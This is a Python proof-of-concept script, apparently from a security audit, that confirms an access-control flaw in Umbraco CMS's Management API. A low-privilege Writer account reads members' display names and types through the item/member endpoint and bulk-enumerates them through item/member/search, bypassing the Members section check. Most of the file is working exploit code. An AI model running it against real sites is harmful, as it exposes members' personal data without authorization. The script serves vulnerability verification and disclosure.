#!/usr/bin/env python3
"""
VULN-019 — Member enumeration via item/member[/search]: the member item endpoints
           omit [Authorize(SectionAccessMembers)] (floor-only) → any backoffice user
           reads front-end members' display names + member types across the Members boundary.

Vulnerable code (targets/Umbraco-CMS/src/Umbraco.Cms.Api.Management):
  * Controllers/Member/Item/MemberItemControllerBase.cs:12-16  — class MemberItemControllerBase
        : ManagementApiControllerBase   (NO [Authorize(SectionAccessMembers)] — the floor only)
  * Controllers/Member/Item/ItemMemberItemController.cs        — GET item/member?id=  (by GUID)
  * Controllers/Member/Item/SearchMemberItemController.cs      — GET item/member/search?query=&take=
  * ViewModels/Member/Item/MemberItemResponseModel.cs          — leaks Variants[].Name, MemberType, Kind
  * contrast — Controllers/Member/MemberControllerBase.cs:21   — [Authorize(SectionAccessMembers)]

Class: Broken access control / PII enumeration across a section boundary (CWE-639, CWE-200).

Flaw (plain English):
  Every "real" member endpoint (MemberControllerBase) is gated by the Members section policy
  (SectionAccessMembers). The member *item* endpoints — meant only to hydrate backoffice pickers —
  derive from MemberItemControllerBase, which inherits only the base BackOfficeAccess floor and
  forgets to re-apply SectionAccessMembers. So any authenticated backoffice user, including a role
  with NO Members access at all (the default Writer holds only Content+Library), can read any
  member's display name + member type by GUID and bulk-enumerate the entire membership through the
  search variant — data the Members section is supposed to gate.

Exploitation idea:
  Admin creates a member with a random display name. Provision a default Writer (Content+Library,
  no Members). Prove the boundary is real: GET /member/{key} → 403. Then GET item/member?id={key}
  → 200 with that member's display name, and GET item/member/search?query=&take=100000 enumerates
  the whole membership — all from a token that is 403-forbidden on the real member surface.

A successful run proves: a low-privilege backoffice user with no Members-section grant reads member
PII (names + types) that the Members section is designed to withhold, and enumerates the membership.
"""
import json
import os
import sys
import time
import uuid

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c

VID = "VULN-019"
WRITER_KEY = "9fc2a16f-528c-46d6-a014-75bf4ec2480c"      # default Writers group (Content + Library only)
DEFAULT_MEMBER_TYPE = "d59be02f-1df9-4228-aa1e-01917d806cda"  # the built-in "Member" type (live-confirmed)


def create_member(admin, name, sfx):
    key = str(uuid.uuid4())
    payload = {
        "id": key,
        "email": f"m_{sfx}@example.invalid",
        "username": f"m_{sfx}",
        "password": f"M_{sfx}!aA1",
        "memberType": {"id": DEFAULT_MEMBER_TYPE},
        "isApproved": True,
        "groups": [],
        "values": [],
        "variants": [{"culture": None, "segment": None, "name": name}],
    }
    r = admin.post("/member", json=payload)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create member failed: HTTP {r.status_code} {r.text[:300]}")
    return key


def main() -> int:
    c.banner(VID, "item/member[/search] is floor-only → cross-section member PII enumeration",
             "MemberItemControllerBase.cs:12 (no SectionAccessMembers) — GET item/member[/search]")

    # ---- SETUP (as admin): a member with a random display name to enumerate ----
    admin = c.admin_client()
    c.log("SETUP", "admin authenticated to Management API")
    sfx = c.rnd(4)
    mname = f"SecretMember_{sfx}"
    mkey = create_member(admin, mname, sfx)
    c.log("SETUP", f"created front-end member {mname!r} (key={mkey}) via the Members-gated /member endpoint")

    # ---- provision a default Writer (Content+Library only, NO Members section) ----
    pw = f"Writer_{c.rnd(6)}!aA1"
    u = c.create_user(admin, [WRITER_KEY])
    c.set_password_for_user(admin, u["id"], pw)
    writer = c.ApiClient(u["email"], pw, label="writer")
    sections = writer.get("/user/current").json().get("allowedSections", [])
    c.log("SETUP", f"created default Writer {u['email']}; allowedSections={sections}")
    if "Umb.Section.Members" in sections:
        c.log("FAIL", "Writer unexpectedly has the Members section — cannot establish the boundary")
        return c.verdict(VID, "FAILED", "test principal has Members access")
    c.log("INFO", "Writer holds NO Members section — the Members boundary is what we cross below")

    ok = True

    # ---- CONTRAST: the Members boundary IS enforced on the real member endpoint ----
    c.log("STEP", "baseline: GET /member/{key} via the real, Members-section-gated endpoint")
    r_norm = writer.get(f"/member/{mkey}")
    if r_norm.status_code == 403:
        c.log("PROOF", "GET /member/{key} → 403 Forbidden — SectionAccessMembers is enforced here (as it should be)")
    else:
        c.log("FAIL", f"GET /member/{{key}} returned {r_norm.status_code}, expected 403 — boundary not established")
        ok = False

    # ---- ATTACK 1: by-GUID item read leaks the member's display name + type + kind ----
    c.log("STEP", "attack: GET item/member?id={key} (floor-only item endpoint) — the section check is MISSING here")
    r_item = writer.get(f"/item/member?id={mkey}")
    item_leaked = mname in r_item.text if r_item.status_code == 200 else False
    if r_item.status_code == 200 and item_leaked:
        m0 = r_item.json()[0]
        c.log("PROOF", f"item/member → 200 leaked member PII: name={m0.get('variants',[{}])[0].get('name')!r} "
                       f"kind={m0.get('kind')} memberType={m0.get('memberType',{}).get('icon')}")
    else:
        c.log("FAIL", f"item/member status={r_item.status_code}; name present={item_leaked}; body={r_item.text[:200]}")
        ok = False

    # ---- ATTACK 2: search variant bulk-enumerates the membership (Lucene index; retry for async indexing) ----
    c.log("STEP", "attack: GET item/member/search?query=Secret&take=100000 — bulk enumeration (unclamped take)")
    r_search = None
    enum_total = 0
    for attempt in range(12):
        r_search = writer.get("/item/member/search?query=Secret&take=100000")
        if r_search.status_code == 200:
            enum_total = r_search.json().get("total", 0)
            if enum_total >= 1 and mname in r_search.text:
                break
        time.sleep(2)
    if r_search is not None and r_search.status_code == 200 and enum_total >= 1 and mname in r_search.text:
        names = [i.get("variants", [{}])[0].get("name") for i in r_search.json().get("items", [])]
        c.log("PROOF", f"item/member/search → 200, total={enum_total}; enumerated member names include {names[:5]}")
        c.log("PROOF", "a Writer with no Members section just enumerated the membership across the section boundary")
    else:
        # Non-fatal: the by-GUID leak already proves the missing-section-check; the Lucene index may lag.
        st = r_search.status_code if r_search is not None else "n/a"
        c.log("INFO", f"search enumeration inconclusive (status={st}, total={enum_total}) — Lucene index may be "
                      f"rebuilding; the by-GUID item read above already proves the boundary bypass")

    # persist the decisive request/response
    here = os.path.dirname(__file__)
    with open(os.path.join(here, "request.http"), "w") as f:
        f.write("# All requests sent as the default Writer (Content+Library only, NO Members section)\n\n"
                f"# ATTACK — by-GUID member PII read (floor-only item endpoint):\n"
                f"GET {c.MGMT}/item/member?id={mkey} HTTP/1.1\n"
                f"Authorization: Bearer <writer-token>\n\n"
                f"# ATTACK — bulk membership enumeration (unclamped take):\n"
                f"GET {c.MGMT}/item/member/search?query=Secret&take=100000 HTTP/1.1\n"
                f"Authorization: Bearer <writer-token>\n\n"
                f"# CONTRAST — same user, real Members-gated endpoint => 403:\n"
                f"GET {c.MGMT}/member/{mkey} HTTP/1.1\nAuthorization: Bearer <writer-token>\n")
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"member created this run: {mname}  (key={mkey})\n")
        f.write(f"GET /member/{mkey}                 (real, section-gated) -> {r_norm.status_code}\n")
        f.write(f"GET /item/member?id={mkey}         (floor-only item)     -> {r_item.status_code}\n")
        if r_item.status_code == 200:
            f.write(f"    leaked: {json.dumps(r_item.json(), indent=2)}\n")
        if r_search is not None:
            f.write(f"GET /item/member/search?query=Secret&take=100000       -> {r_search.status_code}, "
                    f"total={enum_total}\n")

    if ok:
        return c.verdict(VID, "CONFIRMED",
                         "Writer with no Members section read member PII via item/member (403 on the real /member)")
    return c.verdict(VID, "FAILED", "could not reproduce the item/member cross-section leak")


if __name__ == "__main__":
    sys.exit(main())
